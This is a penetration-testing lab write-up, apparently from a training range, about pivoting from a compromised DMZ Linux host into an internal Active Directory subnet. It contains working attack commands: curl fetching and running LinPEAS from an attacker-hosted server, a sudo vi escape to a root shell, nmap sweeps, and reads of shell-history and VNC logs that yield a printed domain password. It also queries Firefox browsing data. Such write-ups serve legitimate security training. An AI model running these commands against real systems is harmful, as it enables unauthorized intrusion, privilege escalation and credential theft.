# Exploitation Enumeration & Foothold Analysis

## Overview
- **Initial Foothold:** SSH access to a Linux host located in the DMZ network
- **External Scope:** `192.168.80.0/24`
- **Internal Scope:** `192.168.98.0/24`

---

## 1. File Transfer & Ingress Tooling via VPN Routing

### Mechanics: Multi-Homed Network Routing
When staging tools (such as LinPEAS or enumeration scripts) from an attacker workstation to a compromised lab instance, network routing depends on the active network interfaces:

| Interface | Type | Role & Behavior |
| :--- | :--- | :--- |
| `ens33` | Physical / Hypervisor NAT | Handles local host networking (e.g., `192.168.15.162`). Not routable from isolated lab targets. |
| `tun0` | Virtual Point-to-Point (VPN) | Assigned by the lab VPN tunnel (e.g., `10.10.200.2`). Directly routable to lab endpoints. |

#### Why the Connection Works:
1. **Socket Binding (`0.0.0.0`):** Running a Python HTTP server bound to `0.0.0.0:8000` instructs the operating system to listen on all interfaces (`INADDR_ANY`), accepting incoming traffic on both `ens33` and `tun0`.
2. **Lab Routing:** The compromised host (`privilege@Linux1`) routes requests to `10.10.200.2` entirely over the lab's VPN routing table to `tun0`. The local host interface (`192.168.15.162`) remains untouched.

### Execution Steps
On the attacker machine:
```bash
# Navigate to the local staging directory
cd /opt/tools

# Start a simple HTTP listener on port 8000
python3 -m http.server 8000
```

On the compromised DMZ target:
```bash
# Move to a writable directory (/tmp or /dev/shm)
cd /tmp

# Download the enumeration script directly to disk
curl -s http://10.10.200.2:8000/linpeas.sh -o lin.sh

# Assign execution permissions and run
chmod +x lin.sh
./lin.sh
```

---

## 2. Local Privilege Escalation (Linux DMZ Host)

### GTFOBins: Sudo vi Shell Escape
Checking `sudo -l` reveals that the current user has permission to execute `/usr/bin/vi` with elevated privileges without a password (or with known credentials):

```bash
# Execute vi under sudo context
sudo vi
```

Inside the `vi` editor interface, drop into an interactive root shell using the command execution feature:
```vim
:!/bin/bash
```
*Result: An interactive bash shell with UID 0 (`root`) is spawned.*

---

## 3. Internal Network Reconnaissance (Dual-Homed Pivot)

From the newly obtained root shell on the DMZ box, route exploration into the dual-homed internal subnet (`192.168.98.0/24`).

### Active Host Discovery & Fingerprinting

```bash
# Sweep the internal network for active hosts and core services
nmap -sC -sV -p 88,135,139,389,445,3389 192.168.98.0/24 -oN internal_discovery.txt
```

#### Identified Targets

1. **Domain Controller (`192.168.98.2`):**
   - Discovered services: Kerberos (`88`), LDAP (`389`), SMB (`445`).
   - Role identified: Active Directory Domain Controller (DC).
   - Nmap Scan Command:
     ```bash
     nmap -sC -sV -p- -T4 192.168.98.2
     ```

2. **Windows Workstation / Member Server (`192.168.98.30`):**
   - Discovered services: RPC (`135`), SMB (`445`), RDP (`3389`).
   - Role identified: Domain Member Server.
   - Nmap Scan Command:
     ```bash
     nmap -sC -sV -p 135,139,445,3389 192.168.98.30
     ```

---

## 4. Credential Harvesting & Artifact Inspection

### Checking User Histories & Application Logs
Linux user directories often contain residues of past operations, database queries, and remote desktop credentials.

```bash
# Check database query logs for credentials or sensitive queries
cat ~/.mysql_history

# Inspect VNC and display server logs
cat ~/.vnc_log
```

#### Discovered Credentials:
- **Source:** `.vnc_log`
- **Domain:** `Child`
- **Username:** `employee`
- **Password:** `Doctor@963`
- **Format:** `Child\employee:Doctor@963`

---

## 5. Browser Artifact Forensics (Mozilla Firefox)

Firefox stores user history, form entries, and bookmarks in SQLite databases within user profile directories.

### Navigating to the Active Firefox Profile
```bash
cd ~/.mozilla/firefox/*.default-release/
```

### Inspecting Bookmarks and Visited URLs (`places.sqlite`)
The `places.sqlite` database stores both history (`moz_places`) and bookmarks (`moz_bookmarks`).

```bash
# Verify the database is present
ls -la places.sqlite

# Query using sqlite3 CLI
sqlite3 places.sqlite
```

Inside the `sqlite3` prompt:
```sql
-- List tables to identify schema structure
.tables

-- Retrieve all bookmarks
SELECT id, fk, type, parent, title FROM moz_bookmarks;

-- Correlate bookmarks with destination URLs
SELECT b.title, p.url 
FROM moz_bookmarks b 
JOIN moz_places p ON b.fk = p.id;
```

---

## Key Takeaways & Next Steps
- The DMZ Linux machine served as an entry pivot bridging `192.168.80.0/24` and `192.168.98.0/24`.
- Extracted domain credentials (`Child\employee`) can now be tested against the internal targets (`192.168.98.2` and `192.168.98.30`) via SMB (`CrackMapExec`/`NetExec`), WinRM, or Kerberos authentication.